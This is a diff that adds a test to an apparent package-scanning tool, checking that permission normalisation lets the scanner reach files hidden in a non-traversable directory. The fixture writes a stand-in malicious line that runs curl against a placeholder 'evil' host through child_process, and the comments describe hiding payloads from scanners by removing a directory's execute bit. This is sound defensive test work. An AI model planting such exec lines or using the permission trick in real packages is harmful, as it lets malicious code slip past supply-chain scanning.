@@ -12,6 +12,7 @@ const {
   parseReference,
   collectSourceFiles,
   extractTarball,
+  normalizeTreePermissions,
   parseTarListingLine
 } = require("../src/quarantine");
 
@@ -305,4 +306,30 @@ test("extractTarball fails CLOSED on a hostile listing (real archive path is a r
     await extractTarball(archive, dest);
     assert.ok((await fs.readdir(dest)).length > 0, "benign hardlink archive should extract");
   }
+});
+
+test("normalizeTreePermissions makes a non-traversable dir readable so hidden code is scanned, not skipped", async () => {
+  // A package can ship a directory with no execute bit (pngjs ships lib/ as 0644)
+  // — by accident or to hide a payload from the static walk so the scan aborts on
+  // EACCES and degrades to review instead of reading the code. The staging step
+  // normalizes owner read/traverse across the extracted tree so the walk always
+  // reaches every file. Without the fix, lstat of the hidden file throws EACCES.
+  const root = await fs.mkdtemp(path.join(os.tmpdir(), "sca-perms-"));
+  const lib = path.join(root, "lib");
+  await fs.mkdir(lib);
+  const hidden = path.join(lib, "secret.js");
+  await fs.writeFile(hidden, "require('child_process').exec('curl evil');");
+  // Break it: drop the directory's execute (traverse) bit. The file is already on
+  // disk; now it cannot be lstat'd through the directory.
+  await fs.chmod(lib, 0o644);
+  await assert.rejects(fs.lstat(hidden), /EACCES/, "precondition: dir is non-traversable");
+
+  await normalizeTreePermissions(root);
+
+  const dirMode = (await fs.stat(lib)).mode;
+  assert.ok(dirMode & 0o100, "owner-execute (traverse) restored on the directory");
+  const body = await fs.readFile(hidden, "utf8");
+  assert.match(body, /child_process/, "the previously hidden file is now readable");
+  const fileMode = (await fs.stat(hidden)).mode;
+  assert.ok((fileMode & 0o111) === 0, "u+rX must NOT make a regular file executable");
 });
